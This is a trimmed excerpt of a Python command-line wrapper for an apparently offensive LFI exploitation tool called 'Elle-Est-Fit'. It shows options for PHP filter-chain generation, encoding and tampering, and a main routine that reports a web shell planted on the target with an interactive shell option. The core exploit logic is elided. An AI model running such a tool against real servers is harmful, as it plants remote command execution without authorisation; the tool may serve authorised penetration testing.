...
def parse_args():
    ...
    parser.add_argument(
        "--version", action="version", version=f"Elle-Est-Fit v{__version__}"
    )
    ...
    target_group.add_argument(
        "--url",
        help="Target URL with LFI vulnerability (use FUZZ as the placeholder for the LFI path)",
    )

    # Technique options
    technique_group = parser.add_argument_group("Technique")
    technique_group.add_argument(
        "--technique", help="Specific technique to use (default: auto-detect)"
    )
    technique_group.add_argument(
        "--list-techniques", action="store_true", help="List available techniques"
    )
    technique_group.add_argument(
        "--dump-chain",
        help="Generate and dump a PHP filter chain for the given PHP code",
    )
    technique_group.add_argument(
        "--test-chain", help="Test a specific PHP filter chain against the target URL"
    )

    # Encoding options
    encoding_group = parser.add_argument_group("Encoding")
    encoding_group.add_argument(
        "--double-url-encode", action="store_true", help="Apply double URL encoding"
    )
    encoding_group.add_argument(
        "--tamper", help="Python code for custom tampering function"
    )
    ...
    output_group.add_argument(
        "--interactive",
        action="store_true",
        help="Start an interactive shell after exploitation",
    )
        ...
        try:
            ...
            for attr_name in dir(module):
                ...
                if (
                    ...
                    and issubclass(attr, TechniqueBase)
                    and attr != TechniqueBase
                ):
                    # Print the technique info
                    console.print(
                        f"  [success]{attr.name}[/success]: {attr.description}"
                    )
        ...
        try:
            ...
            if cmd.strip():
                try:
                    ...
                    console.print(
                        "The shell method is missing from the LFI class. Please check the core.py file.",
                        style="error",
                    )
                    break
...
def test_chain(url, chain, verbose=False):
    ...
    try:
        ...
        if response.status_code == 200:
            ...
            console.print(
                Panel(
                    response.text[:1000], title="Response Preview", border_style="cyan"
                )
            )
...
def main():
    ...
    if args.dump_chain:
        try:
            ...
            console.print(
                Panel(
                    chain[:200] + "..." if len(chain) > 200 else chain,
                    title="Filter Chain",
                    border_style="cyan",
                )
            )
    ...
    if not args.url:
        console.print(
            "Error: --url is required unless --list-techniques or --dump-chain is specified",
            style="error",
        )
        return 1
    ...
    try:
        ...
        console.print(
            "[warning]Note: If you experience HTTP 414 errors (URI Too Long), try shorter payloads[/warning]"
        )
        console.print("[info]Attempting exploitation...[/info]")
        # Attempt to exploit
        if lfi.exploit():
            console.print(
                f"[success]Exploitation successful![/success] Shell created at {lfi.target.replace('{}','')+lfi.shell_path}&cmd=id",
                style="success",
            )
